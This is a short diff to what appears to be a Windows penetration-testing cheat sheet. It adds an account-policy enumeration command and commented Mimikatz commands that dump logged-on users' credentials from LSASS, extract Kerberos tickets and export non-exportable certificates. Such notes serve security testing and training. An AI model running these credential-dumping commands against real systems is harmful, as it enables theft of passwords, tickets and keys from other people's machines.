@@ -97,6 +97,9 @@ Get-LocalUser
 net user username
 whoami /groups
 
+#Show account policy (password requirements, lockout threshold etc.)
+net accounts
+
 #Check what privileges the user has
 whoami /priv
 
@@ -451,3 +454,17 @@ bloodhound
 #As SSO is being used by Kerberos in MS environ the password hashes are stored in Local Security Authority Subsystem Service (LSASS). One would still
 #need LA or SYSTEM creds to extract these and try to decrypt passwords from the hashes with for example Mimikatz (not preferrably being run on the target
 #as it is so well known that you will get caught red handed).
+
+--
+
+#Still it's good to handle the basics of Mimikatz through admin powershell access:
+#Enable SeDebugPrivilege
+privilege::debug
+#Dump creds of all logged-on users on the host, on older systems WDigest hashes were used and Mimikatz will automatically decrypt them, others need to
+#be cracked by other means
+sekurlsa::logonpasswords
+#You can also use TGT and Service Tickets, so to get the current user's ticket you'd for example to dir on a SMB share, and then spawn:
+sekurlsa::tickets
+#If you're lucky and the host is a CA for the domain, you can export unexportable certificates:
+crypto::capi
+crypto::cng
